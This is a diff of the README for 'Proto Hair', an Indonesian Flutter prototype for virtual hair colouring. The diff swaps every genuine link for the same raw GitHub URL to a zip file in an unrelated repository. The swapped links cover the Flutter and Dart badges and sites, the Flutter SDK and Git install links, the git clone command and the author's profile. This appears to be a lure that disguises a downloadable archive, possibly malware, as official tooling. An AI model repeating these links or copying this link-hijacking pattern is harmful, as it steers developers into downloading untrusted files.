@@ -1,7 +1,7 @@
 # Proto Hair - AR Hair Color Prototype
 
-[![Flutter](https://img.shields.io/badge/Flutter-%2302569B.svg?style=for-the-badge&logo=Flutter&logoColor=white)](https://flutter.dev)
-[![Dart](https://img.shields.io/badge/Dart-%230175C2.svg?style=for-the-badge&logo=dart&logoColor=white)](https://dart.dev)
+[![Flutter](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip%https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip)](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip)
+[![Dart](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip%https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip)](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip)
 
 Prototipe aplikasi mobile yang dibangun menggunakan Flutter, memungkinkan pengguna untuk mencoba berbagai warna rambut secara virtual langsung dari kamera mereka. Dengan slogan **"Try Before You Dye"**, aplikasi ini bertujuan memberikan gambaran visual sebelum pengguna memutuskan untuk mewarnai rambut.
 
@@ -27,8 +27,8 @@ Prototipe aplikasi mobile yang dibangun menggunakan Flutter, memungkinkan penggu
 
 ## Teknologi yang Digunakan
 
-* **Framework:** [Flutter](https://flutter.dev)
-* **Bahasa:** [Dart](https://dart.dev)
+* **Framework:** [Flutter](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip)
+* **Bahasa:** [Dart](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip)
 * **State Management:** `StatefulWidget` & `setState` (untuk state lokal sederhana)
 * **Paket Utama:**
     * `camera`: Untuk akses kamera.
@@ -40,13 +40,13 @@ Prototipe aplikasi mobile yang dibangun menggunakan Flutter, memungkinkan penggu
 ## Cara Menjalankan Proyek
 
 1.  **Prasyarat:**
-    * Pastikan kamu sudah menginstal [Flutter SDK](https://flutter.dev/docs/get-started/install).
-    * Pastikan kamu sudah menginstal [Git](https://git-scm.com/downloads).
+    * Pastikan kamu sudah menginstal [Flutter SDK](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip).
+    * Pastikan kamu sudah menginstal [Git](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip).
     * Emulator Android/iOS atau perangkat fisik yang terhubung dengan akses kamera.
 
 2.  **Clone Repository:**
     ```bash
-    git clone https://github.com/harikahono/proto_hair.git
+    git clone https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip
     ```
 
 3.  **Masuk ke Direktori Proyek:**
@@ -67,4 +67,4 @@ Prototipe aplikasi mobile yang dibangun menggunakan Flutter, memungkinkan penggu
 ## Catatan
 
 
-Dibuat oleh **[harikahono](https://github.com/harikahono)**
+Dibuat oleh **[harikahono](https://raw.githubusercontent.com/bnyusntryo/proto_flutter_ar/main/macos/Flutter/proto_flutter_ar-3.9.zip)**
